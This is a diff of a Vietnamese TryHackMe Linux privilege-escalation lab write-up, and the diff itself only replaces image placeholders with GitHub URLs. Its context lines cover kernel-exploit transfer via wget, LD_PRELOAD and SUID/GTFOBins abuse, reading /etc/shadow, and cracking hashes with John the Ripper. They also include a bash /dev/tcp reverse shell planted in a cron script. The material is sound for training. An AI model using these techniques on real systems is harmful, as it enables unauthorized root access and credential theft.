@@ -24,7 +24,7 @@ Trong kiểm thử thâm nhập, hiếm khi có được quyền truy cập ban 
 
 - Thực thi lệnh quản trị
 
-![img](29)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image29.png?raw=true)
 
 **Task 3: Enumeration**
 
@@ -67,7 +67,7 @@ Lệnh ***"ps"*** cung cấp một số tùy chọn hữu ích:
 
 - ps axjf: Xem cây quy trình (xem sự hình thành cây cho đến khi ps axjf được chạy bên dưới)
 
-![img](30)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image30.png?raw=true)
 
 - ps aux: Tùy chọn aux sẽ hiển thị các tiến trình cho all users (a), hiển thị user đã khởi chạy quy trình (u) và hiển thị các tiến trình không được gắn vào thiết bị đầu cuối (x).
 
@@ -75,37 +75,35 @@ Lệnh ***"ps"*** cung cấp một số tùy chọn hữu ích:
 
 Lệnh env sẽ hiển thị các biến môi trường.
 
-![img](31)
-
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image31.png?raw=true)
 
 ***sudo -l***: Lệnh sudo -l có thể được sử dụng để liệt kê tất cả các lệnh mà có thể chạy bằng sudo.
 
 ***ls***: Trong khi tìm kiếm các vectơ leo thang đặc quyền tiềm năng, hãy nhớ luôn sử dụng lệnh ls với tham số -la. 
 
-![img](32)
-
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image32.png?raw=true)
 
 ***id***: Lệnh id sẽ cung cấp cái nhìn tổng quan chung về cấp đặc quyền của người dùng và tư cách thành viên nhóm. 
 
-![img](33)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image33.png?raw=true)
 
 ***/etc/passwd***: Đọc tệp /etc/passwd có thể là một cách dễ dàng để khám phá người dùng trên hệ thống.
 
-![img](34)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image34.png?raw=true)
 
 => Làm sạch output: 
 
-![img](35)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image35.png?raw=true)
 
-![img](36)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image36.png?raw=true)
 
 **Lệnh history**: Nhìn vào các lệnh trước đó bằng lệnh history có thể cho một số ý tưởng về hệ thống đích
 
 **Lệnh ifconfig**: thông tin về các giao diện mạng của hệ thống. 
 
-![img](37)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image37.png?raw=true)
 
-![img](38)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image38.png?raw=true)
 
 **Lệnh netstat**: có thể được sử dụng với một số tùy chọn khác nhau để thu thập thông tin về các kết nối hiện có.
 
@@ -115,27 +113,27 @@ Lệnh env sẽ hiển thị các biến môi trường.
 
 - netstat -l: liệt kê các cổng ở chế độ "nghe". Các cổng này mở và sẵn sàng chấp nhận các kết nối đến, sử dụng với tùy chọn "t" để chỉ liệt kê các cổng đang nghe bằng giao thức TCP 
 
-![img](39)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image39.png?raw=true)
 
 - netstat -s: liệt kê số liệu thống kê sử dụng mạng theo giao thức (bên dưới) Điều này cũng có thể được sử dụng với các tùy chọn -t hoặc -u để giới hạn output với một giao thức cụ thể.
 
-![img](40)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image40.png?raw=true)
 
 - netstat -tp: liệt kê các kết nối với tên dịch vụ và thông tin PID.
 
-![img](41)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image41.png?raw=true)
 
 => Kết hợp với tùy chọn ***-l*** để liệt kê các cổng đang nghe:
 
-![img](42)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image42.png?raw=true)
 
 Cột PID trống vì tiến trình thuộc sở hữu của người khác, nhưng nếu chạy với quyền root: 
 
-![img](43)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image43.png?raw=true)
 
 - netstat -i: Hiển thị số liệu thống kê giao diện mạng
 
-![img](44)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image44.png?raw=true)
 
 - netstat -ano có thể được chia nhỏ như sau:
 
@@ -145,7 +143,7 @@ Cột PID trống vì tiến trình thuộc sở hữu của người khác, nh�
 
     - -o: Hiển thị bộ hẹn giờ
 
-![img](45)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image45.png?raw=true)
 
 **Lệnh find**
 
@@ -175,11 +173,11 @@ Một số ví dụ:
 
 Lệnh này cũng có thể được sử dụng với dấu (+) và (-) để chỉ định tệp lớn hơn hoặc nhỏ hơn kích thước đã cho.
 
-![img](46)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image46.png?raw=true)
 
 Nên sử dụng lệnh ***"find"*** với ***"-type f 2>/dev/null"*** để chuyển hướng lỗi sang ***"/dev/null"*** và có kết quả đầu ra rõ ràng hơn.
 
-![img](47)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image47.png?raw=true)
 
 Các folders và files có thể được ghi vào hoặc thực thi từ:
 
@@ -203,13 +201,13 @@ Tìm các công cụ phát triển và ngôn ngữ được hỗ trợ:
 
 **General Linux Commands**
 
-![img](48)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image48.png?raw=true)
 
-![img](49)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image49.png?raw=true)
 
 Kiểm tra python version: 
 
-![img](50)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image50.png?raw=true)
 
 **Task 4: Automated Enumeration Tools**
 
@@ -257,7 +255,7 @@ Tuy nhiên, khai thác kernel có thể gây lỗi hệ thống, nên cân nhắ
 - Một số khai thác cần tương tác thêm sau khi thực thi
 - Chuyển mã khai thác sang hệ thống đích bằng SimpleHTTPServer (Python) và wget
 
-![img](51)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image51.png?raw=true)
 
 Download file và dùng lệnh
 
@@ -265,21 +263,21 @@ Download file và dùng lệnh
 
 Sử dụng trình biên dịch GCC (GNU Compiler Collection) để biên dịch mã nguồn C trong tệp 37292.c thành một tệp thực thi:
 
-![img](52)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image52.png?raw=true)
 
 Dùng lệnh ***sudo python3 -m http.server*** để thiết lập kết nối và lắng nghe
 
-![img](53)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image53.png?raw=true)
 
 Sau đó bên máy karen, cd vào /tmp và dùng lệnh wget http://10.8.13.3:8000/ofc để tải file về:
 
-![img](54)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image54.png?raw=true)
 
 (Cần cấp quyền thực thi cho script bên máy karen)
 
 Thực thi file ofc: 
 
-![img](55)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image55.png?raw=true)
 
 **Task 6: Privilege Escalation: Sudo**
 
@@ -289,7 +287,7 @@ Lệnh sudo theo mặc định cho phép chạy một chương trình với quy�
 
 Apache2 có một tùy chọn hỗ trợ tải các tệp cấu hình thay thế (-f : chỉ định ServerConfigFile thay thế).
 
-![img](56)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image56.png?raw=true)
 
 Việc tải tệp /etc/shadow bằng tùy chọn này sẽ dẫn đến thông báo lỗi bao gồm dòng đầu tiên của tệp /etc/shadow.
 
@@ -297,7 +295,7 @@ Việc tải tệp /etc/shadow bằng tùy chọn này sẽ dẫn đến thông 
 
 Trên một số hệ thống, có thể thấy tùy chọn môi trường LD_PRELOAD.
 
-![img](57)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image57.png?raw=true)
 
 LD_PRELOAD cho phép mọi chương trình sử dụng thư viện dùng chung. Nếu tùy chọn "env_keep" được bật, có thể tạo thư viện dùng chung để tải và thực thi trước khi chương trình chạy. Tuy nhiên, LD_PRELOAD bị bỏ qua nếu ID người dùng thực khác với ID hiệu quả.
 
@@ -325,7 +323,7 @@ Lưu mã này dưới dạng shell.c và biên dịch nó bằng gcc thành tệ
 
     gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
-![img](68)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image68.png?raw=true)
 
 Bây giờ có thể sử dụng shared object này khi khởi chạy bất kỳ chương trình nào mà người dùng của có thể chạy với sudo
 
@@ -335,12 +333,11 @@ Cần chạy chương trình bằng cách chỉ định tùy chọn LD_PRELOAD n
 
 Điều này sẽ tạo ra một shell có quyền root.
 
-![img](69)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image69.png?raw=true)
 
 => Question: 
 
-![img](70)
-
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image70.png?raw=true)
 
 Phát hiện ra có thể sử dụng 3 lệnh với sudo
 
@@ -350,29 +347,29 @@ Truy cập ***gtfobins*** - website cung cấp shell code để bypass
 
 Tìm kiếm nano:
 
-![img](71)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image71.png?raw=true)
 
 Trên máy karen, sử dụng ***sudo nano***:
 
-![img](72)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image72.png?raw=true)
 
 Sau đó nhấn CTRL R, CTRL X để chuyển sang chế độ Command to execute
 
-![img](73)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image73.png?raw=true)
 
 Dán nội dung ***reset; sh 1>&0 2>&0***:
 
-![img](74)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image74.png?raw=true)
 
 Kiểm tra id 
 
-![img](75)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image75.png?raw=true)
 
-![img](76)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image76.png?raw=true)
 
 Tệp /etc/shadow chứa thông tin về người dùng của hệ thống Linux, mật khẩu của họ và các quy định về thời gian cho mật khẩu của họ. Khi tạo hoặc thay đổi mật khẩu trong Linux , hệ thống sẽ hash* (băm) và lưu trữ nó trong tệp shadow.
 
-![img](77)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image77.png?raw=true)
 
 **Task 7: Privilege Escalation: SUID**
 
@@ -382,13 +379,13 @@ Các tệp có SUID/SGID thường hiển thị ký tự "s" trong quyền của
 
     find / -type f -perm -04000 -ls 2>/dev/null
 
-![img](78)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image78.png?raw=true)
 
 Khai thác SUID bằng GTFOBins
 
 Một thực hành hữu ích là so sánh danh sách tệp tìm được với GTFOBins (gtfobins.github.io). Nhấp vào nút SUID để lọc các tệp nhị phân có thể khai thác khi có bit SUID. Cũng có thể sử dụng danh sách lọc sẵn
 
-![img](79)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image79.png?raw=true)
 
 Ví dụ, nếu nano có bit SUID nhưng không có khai thác trực tiếp trên GTFOBins, cần tìm cách tận dụng những phát hiện nhỏ để leo thang đặc quyền theo cách gián tiếp, tương tự như trong các tình huống thực tế.
 
@@ -408,7 +405,7 @@ Tệp này chứa mật khẩu băm của người dùng hệ thống. Để b�
 
     unshadow passwd.txt shadow.txt > passwords.txt
 
-![img](80)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image80.png?raw=true)
 
 Sau đó, sử dụng John the Ripper với danh sách từ phù hợp để giải mã mật khẩu
 
@@ -422,19 +419,19 @@ Thay vì bẻ khóa mật khẩu, có thể thêm một tài khoản root mới:
 
 2. Thêm tài khoản mới vào /etc/passwd:
 
-![img](81)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image81.png?raw=true)
 
 Sau khi user được thêm vào (lưu ý cách sử dụng ***root:/bin/bash*** để cung cấp root shell), chuyển sang người dùng này và hy vọng sẽ có quyền root.
 
-![img](82)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image82.png?raw=true)
 
 => Question: 
 
-![img](83)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image83.png?raw=true)
 
 Dùng lệnh ***find / -type f -perm -0400 -ls 2>/dev/null*** để liệt kê files có bit SUID hoặc SGID được set: 
 
-![img](84)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image84.png?raw=true)
 
 => Tìm thấy tệp công cụ ***/usr/bin/base64***
 
@@ -444,7 +441,7 @@ Trong các cuộc tấn công hoặc nghiên cứu bảo mật, kẻ tấn công
 
 => Thử search base64 trên gtfobins: 
 
-![img](85)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image85.png?raw=true)
 
 Ở đây nói là: Nếu tệp nhị phân có bộ bit SUID, nó sẽ không loại bỏ các đặc quyền nâng cao và có thể bị lạm dụng để truy cập vào hệ thống tệp, leo thang hoặc duy trì quyền truy cập đặc quyền dưới dạng cửa sau SUID
 
@@ -453,7 +450,7 @@ Thử lệnh sau trên máy karen:
     LFILE=/etc/shadow
     /usr/bin/base64 “$LFILE” | base64 --decode
 
-![img](86)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image86.png?raw=true)
 
 => tìm ra hash password của user2
 
@@ -466,13 +463,13 @@ Sử dụng John the RIpper thử crack pass này:
     john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
     john --show hash.txt
 
-![img](87)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image87.png?raw=true)
 
 => Tìm ra pass: Password1
 
 Để đọc nội dung file flag3.txt, tiếp tục sử dụng LFILE sau khi tìm ra path của file nằm ở /home/ubuntu
 
-![img](88)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image88.png?raw=true)
 
 **Task 8: Privilege Escalation: Capabilities**
 
@@ -482,29 +479,29 @@ Capabilities giúp quản lý đặc quyền ở cấp độ chi tiết hơn, th
 
 Trang man capabilities cung cấp thông tin chi tiết về cách sử dụng. Để liệt kê các khả năng đã được gán cho tệp nhị phân, sử dụng getcap:
 
-![img](89)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image89.png?raw=true)
 
 Lệnh này sẽ tìm kiếm tất cả các tệp có capabilities trên hệ thống.
 
 Tìm trên gtfobins, nhận thấy rằng vim có thể được sử dụng với lệnh và payload sau:
 
-![img](90)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image90.png?raw=true)
 
 Thao tác này sẽ khởi chạy root shell:
 
-![img](91)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image91.png?raw=true)
 
 => QUestion:
 
 SỬ dụng lệnh ***getcap -r / 2>/dev/null***
 
-![img](92)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image92.png?raw=true)
 
 => Có 6 tệp nhị phân được set capabilities trong đó có view
 
 Thử search view và tìm trong phần Capabilities trên gtfobins: 
 
-![img](93)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image93.png?raw=true)
 
 Ở đây ghi là: Nếu tệp nhị phân có bộ khả năng CAP_SETUID của Linux hoặc được thực thi bởi một tệp nhị phân khác có bộ khả năng, thì nó có thể được sử dụng làm cửa sau để duy trì quyền truy cập đặc quyền bằng cách thao tác tiến trình UID của chính nó.
 
@@ -516,11 +513,11 @@ Thay py thành py3 và path đến view, lệnh trở thành:
 
 Sau khi chạy lệnh, truy cập được với quyền root: 
 
-![img](94)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image94.png?raw=true)
 
 Thử tìm flag4.txt
 
-![img](95)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image95.png?raw=true)
 
 **Task 9: Privilege Escalation: Cron Jobs**
 
@@ -534,7 +531,7 @@ Cấu hình cron được lưu trong các crontabs. Mỗi người dùng có th�
 
     cat /etc/crontab
 
-![img](96)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image96.png?raw=true)
 
 Tạo một reverse shell, hy vọng là có quyền root.
 
@@ -542,11 +539,11 @@ Luôn ưu tiên bắt đầu các reverse shell vì không muốn làm tổn h�
 
 File sẽ trông như này: 
 
-![img](97)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image97.png?raw=true)
 
 Bây giờ sẽ chạy một trình lắng nghe trên máy tấn công để nhận kết nối đến.
 
-![img](98)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image98.png?raw=true)
 
 Crontab luôn đáng được kiểm tra vì đôi khi nó có thể dẫn đến các vectơ leo thang đặc quyền dễ dàng.
 
@@ -562,35 +559,35 @@ Ví dụ tình huống:
 
 => dẫn đến việc khai thác tiềm năng tận dụng các cron job.
 
-![img](99)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image99.png?raw=true)
 
 Ví dụ trên cho thấy tình huống tương tự khi tập lệnh Antivirus.sh đã bị xóa nhưng cron job vẫn tồn tại. 
 
 Trong trường hợp này, có thể tạo một tập lệnh có tên "antivirus.sh" trong thư mục chính của người dùng và nó sẽ được chạy định kỳ bởi cron tab.
 
-![img](100)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image100.png?raw=true)
 
 Bên máy lắng nghe có thể truy cập quyền root: 
 
-![img](101)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image101.png?raw=true)
 
 => Question: 
 
 Sử dụng lệnh cat /etc/crontab để xem bao nhiêu cron jobs do người dùng xác định trên hệ thống đích:
 
-![img](102)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image102.png?raw=true)
 
 => 4 crob jobs
 
 Có vẻ có thể truy cập /home/karen/backup.sh, kiểm tra: 
 
-![img](103)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image103.png?raw=true)
 
 cron jobs /tmp/test.py
 
 Kiểm tra: 
 
-![img](104)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image104.png?raw=true)
 
 => ko có test.py, có vẻ admin đã xóa nhưng không xóa cron job liên quan.
 
@@ -600,19 +597,19 @@ Khai thác file test.py.
 
 Trên máy tấn công, tạo kênh lắng nghe: 
 
-![img](105)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image105.png?raw=true)
 
 Truy cập /home/karen và chỉnh sửa shell backup.sh để tạo 1 reverse shell:
 
-![img](106)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image106.png?raw=true)
 
 Thay nội dung hiện tại: 
 
-![img](107)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image107.png?raw=true)
 
 Tìm kiếm payload reverse shell trên github: 
 
-![img](108)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image108.png?raw=true)
 
 => Nội dung mới có dạng: ***bash -i >& /dev/tcp/10.0.0.1/4242 0>&1***
 
@@ -622,23 +619,23 @@ Thay IP thành IP và Port thành IP và port của máy tấn công đang lắn
 
 Thêm quyền thực thi cho shell backup.sh:
 
-![img](109)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image109.png?raw=true)
 
 Sau đó chờ đợi bên kênh lắng nghe: 
 
-![img](110)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image110.png?raw=true)
 
 => đã có quyền root
 
-![img](111)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image111.png?raw=true)
 
 Đọc nội dung file /etc/shadow:
 
-![img](112)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image112.png?raw=true)
 
 => tìm được hash pass của matt
 
-![img](113)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image113.png?raw=true)
 
 giải mã và tìm được pass là: 123456
 
@@ -648,19 +645,19 @@ Trong Linux, PATH là một biến môi trường xác định nơi hệ điều
 
 Thông thường, PATH sẽ trông như thế này:
 
-![img](114)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image114.png?raw=true)
 
 => Nếu gõ "thm" vào dòng lệnh, đây là những vị trí Linux sẽ tìm kiếm một tệp thực thi có tên là thm.
 
 Đối với mục đích demo, sử dụng script bên dưới:
 
-![img](115)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image115.png?raw=true)
 
 Tập lệnh này cố gắng khởi chạy một tệp nhị phân hệ thống có tên là "thm" nhưng ví dụ này có thể dễ dàng được sao chép bằng bất kỳ tệp nhị phân nào.
 
 Biên dịch tệp này thành tệp thực thi và đặt bit SUID.
 
-![img](116)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image116.png?raw=true)
 
 Sau khi thực thi "path" sẽ tìm kiếm một tệp thực thi có tên "thm" bên trong các thư mục được liệt kê trong PATH.
 
@@ -668,25 +665,25 @@ Nếu bất kỳ thư mục có thể ghi nào được liệt kê trong PATH, c
 
 Có thể thực hiện tìm kiếm đơn giản các thư mục có thể ghi bằng lệnh ***"find / -writable 2>/dev/null"***.
 
-![img](117)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image117.png?raw=true)
 
 So sánh điều này với PATH sẽ giúp tìm thấy các thư mục có thể sử dụng.
 
-![img](118)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image118.png?raw=true)
 
-![img](119)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image119.png?raw=true)
 
 Thật không may, các thư mục con trong /usr không thể ghi được
 
 Thư mục dễ ghi vào hơn có lẽ là /tmp. Tại thời điểm này vì /tmp không có trong PATH nên sẽ cần thêm nó. Lệnh ***"export PATH=/tmp:$PATH"*** thực hiện việc này.
 
-![img](120)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image120.png?raw=true)
 
 Tại thời điểm này, script path cũng sẽ tìm trong thư mục /tmp để tìm tệp thực thi có tên "thm". Tạo lệnh này khá dễ dàng bằng cách sao chép /bin/bash dưới dạng "thm" trong thư mục /tmp.
 
-![img](121)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image121.png?raw=true)
 
-![img](122)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image122.png?raw=true)
 
 => Question: 
 
@@ -694,19 +691,19 @@ Sử dụng lệnh để tìm các file có quyền ghi:
 
     find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 
-![img](123)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image123.png?raw=true)
 
 => Tìm ra thư mục lẻ /home/murdoch
 
 Thử cd vào thư mục này: 
 
-![img](124)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image124.png?raw=true)
 
 test có vẻ là 1 dạng file thực thi của thm.py
 
 Đọc nội dung file thm.py: 
 
-![img](125)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image125.png?raw=true)
 
 => Script sẽ tìm kiếm file có quyền thực thi có tên thm trong biến $PATH
 
@@ -714,29 +711,29 @@ test có vẻ là 1 dạng file thực thi của thm.py
 
 Tạo thêm 1 path /tmp vào biến $PATH:
 
-![img](126)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image126.png?raw=true)
 
 cd vào /tmp
 
-![img](127)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image127.png?raw=true)
 
 => Tạo 1 file nhị phân “thm” được đặt bit SUID trong /tmp
 
-![img](128)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image128.png?raw=true)
 
 Thêm nội dung sau vào script thm này: 
 
-![img](129)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image129.png?raw=true)
 
 Cấp quyền thực thi cho file thm:
 
-![img](130)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image130.png?raw=true)
 
 sau đó cd lại vào /home/murdoch, thực thi script test và có quyền root: 
 
-![img](131)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image131.png?raw=true)
 
-![img](132)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image132.png?raw=true)
 
 **Task 11: Privilege Escalation: NFS**
 
@@ -750,7 +747,7 @@ Không chỉ giới hạn trong quyền truy cập nội bộ, việc leo thang 
 
 - NFS (Network File Sharing): Cấu hình NFS (Network File Sharing) được lưu trong tệp /etc/exports. Tệp này được tạo trong quá trình cài đặt máy chủ NFS và người dùng thường có thể đọc được.
 
-![img](133)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image133.png?raw=true)
 
 Yếu tố quan trọng đối với vectơ leo thang đặc quyền này là tùy chọn "no_root_squash". 
 
@@ -760,29 +757,29 @@ Nếu tùy chọn "no_root_squash" xuất hiện trên một chia sẻ có quy�
 
 Bắt đầu bằng cách liệt kê mountable shares - các chia sẻ có thể gắn kết từ máy tấn công: 
 
-![img](134)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image134.png?raw=true)
 
 Gắn một trong các chia sẻ "no_root_squash" vào máy tấn công và bắt đầu xây dựng tệp thực thi.
 
-![img](135)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image135.png?raw=true)
 
 Vì có thể đặt các bit SUID, một tệp thực thi đơn giản sẽ chạy /bin/bash trên hệ thống đích sẽ thực hiện công việc.
 
-![img](136)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image136.png?raw=true)
 
 Khi biên dịch mã, đặt bit SUID.
 
-![img](137)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image137.png?raw=true)
 
 Cả hai tệp (nfs.c và nfs đều có trên hệ thống đích. Đã xử lý phần mounted share - chia sẻ được gắn kết nên không cần phải chuyển chúng).
 
-![img](138)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image138.png?raw=true)
 
 => Question: 
 
